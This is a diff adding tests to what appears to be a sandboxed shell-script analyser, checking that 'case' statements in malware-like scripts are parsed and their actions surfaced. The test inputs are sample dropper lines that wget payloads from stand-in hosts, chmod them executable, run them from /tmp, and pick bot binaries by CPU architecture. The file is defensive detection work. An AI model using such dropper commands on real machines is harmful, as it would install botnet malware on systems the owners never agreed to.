@@ -203,3 +203,84 @@ def test_deep_elif_chain_branches_all_walked():
         "http://192.0.2.150/d",
         "http://192.0.2.150/e",
     }
+
+
+# ---- case ... esac -------------------------------------------------------
+# bashlex 0.18 stubs out every `case` grammar action with NotImplementedError
+# ("type = {pattern}, token = {start}"), which used to discard the WHOLE script.
+# Regression for an init.d persistence script dropped by an ELF bot:
+#   case "$1" in start) /path/to/bot & ;; *) ;; esac
+
+
+def test_init_script_case_statement_parses_and_surfaces_arm_body():
+    script = '#!/bin/sh\ncase "$1" in start) /tmp/.svc-test & ;; *) ;; esac\n'
+    result = BashSimInterpreter().run(script)
+    assert result.parse_errors == []
+    execs = [a for a in result.actions if a.kind == "direct_execution"]
+    assert [a.detail["target"] for a in execs] == ["/tmp/.svc-test"]
+    assert execs[0].conditional is True
+
+
+def test_case_does_not_hide_statements_around_it():
+    script = (
+        "wget http://192.0.2.160/before -O /tmp/b\n"
+        'case "$1" in\n'
+        "  start|restart)\n"
+        "    wget http://192.0.2.160/start -O /tmp/s\n"
+        "    chmod +x /tmp/s\n"
+        "    ;;\n"
+        "  (stop) pkill s ;;\n"
+        "  *) ;;\n"
+        "esac\n"
+        "wget http://192.0.2.160/after -O /tmp/a\n"
+    )
+    result = BashSimInterpreter().run(script)
+    assert result.parse_errors == []
+    fetches = {a.detail["url"]: a for a in result.actions if a.kind == "network_fetch"}
+    assert set(fetches) == {
+        "http://192.0.2.160/before",
+        "http://192.0.2.160/start",
+        "http://192.0.2.160/after",
+    }
+    assert fetches["http://192.0.2.160/before"].conditional is False
+    assert fetches["http://192.0.2.160/start"].conditional is True
+    assert fetches["http://192.0.2.160/after"].conditional is False
+    mutations = sorted(a.command.split()[0] for a in result.actions if a.kind == "system_mutation")
+    assert mutations == ["chmod", "pkill"]
+
+
+def test_multi_arch_case_loader_all_arms_walked_with_variables():
+    script = (
+        "H=loader.test\n"
+        "case $(uname -m) in\n"
+        "  x86_64) wget http://$H/bins/x86 ;;\n"
+        "  arm*) case $(uname -r) in 4.*) wget http://$H/bins/arm7 ;; esac ;;\n"
+        "  mips|mipsel) wget http://$H/bins/mips ;&\n"
+        "  *) wget http://$H/bins/generic ;;\n"
+        "esac\n"
+    )
+    result = BashSimInterpreter().run(script)
+    assert result.parse_errors == []
+    urls = {a.detail["url"] for a in result.actions if a.kind == "network_fetch"}
+    assert urls == {
+        "http://loader.test/bins/x86",
+        "http://loader.test/bins/arm7",
+        "http://loader.test/bins/mips",
+        "http://loader.test/bins/generic",
+    }
+
+
+def test_case_inside_function_resolves_positional_argument():
+    script = (
+        'svc() {\n  case "$1" in\n    start) wget http://192.0.2.170/$2 ;;\n  esac\n}\n'
+        "svc start payload\n"
+    )
+    result = BashSimInterpreter().run(script)
+    assert result.parse_errors == []
+    urls = [a.detail["url"] for a in result.actions if a.kind == "network_fetch"]
+    assert urls == ["http://192.0.2.170/payload"]
+
+
+def test_empty_case_parses_cleanly():
+    result = BashSimInterpreter().run("case x in esac\nmycommand arg1\n")
+    assert result.parse_errors == []
